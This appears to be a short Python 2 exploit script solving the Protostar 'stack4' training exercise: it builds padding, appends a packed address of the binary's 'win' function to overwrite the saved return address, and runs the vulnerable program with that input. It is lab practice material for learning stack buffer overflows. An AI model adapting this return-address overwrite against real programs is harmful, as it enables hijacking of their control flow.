#!/bin/python2
#objdump -M intel -d i686/stack4
#readelf -s i686/stack4
#Address of return
# run < txt4
#!/usr/bin/env python
import struct
from utils import run_command

"""
padding = ''

base_pad = 'A'
for idx in range(20):
   pad = chr(ord(base_pad) + idx)
   padding += 4 * pad
print(padding)
"""

padding = \
'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS'

win_addr = struct.pack('I', 0x080483f4)
exploit = padding + win_addr
run_command('protostar-bin/stack4', exploit)